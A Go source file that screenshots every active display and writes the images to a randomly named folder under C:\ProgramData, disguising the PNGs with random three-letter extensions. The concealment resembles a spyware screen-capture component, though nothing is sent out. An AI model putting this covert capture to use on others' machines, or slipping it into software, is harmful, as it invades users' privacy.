package main

import (
	"fmt"
	"github.com/kbinani/screenshot"
	"image"
	"image/png"
	"math/rand"
	"os"
	"time"
)

func checkScreens() int {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		panic("Display not found")
	}
	return n
}

func takeScreenShoot(i int) (*image.RGBA, image.Rectangle) {
	bounds := screenshot.GetDisplayBounds(i)

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		panic(err)
	}
	return img, bounds
}

func saveScreenShoot(img *image.RGBA, filePath string) {
	file, err := os.Create(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	err = png.Encode(file, img)
	if err != nil {
		panic(err)
	}
}

func randomWord(n int) string {
	rand.New(rand.NewSource(time.Now().UnixNano()))
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	var ext []rune = make([]rune, n)
	for i := range ext {
		ext[i] = letters[rand.Intn(len(letters))]
	}
	return string(ext)
}

func createFolder(folderName string) string {
	folderPath := "C:\\ProgramData\\" + folderName
	err := os.MkdirAll(folderPath, os.ModePerm)
	if err != nil {
		panic(err)
	}
	return folderPath
}

func main() {
	var n int = checkScreens()

	folderPath := createFolder(randomWord(6))

	for i := 0; i < n; i++ {
		img, bounds := takeScreenShoot(i)
		ext := randomWord(3)

		var fileName string = fmt.Sprintf("%s\\%d_%dx%d.%s", folderPath, i, bounds.Dx(), bounds.Dy(), ext)
		saveScreenShoot(img, fileName)
	}
}
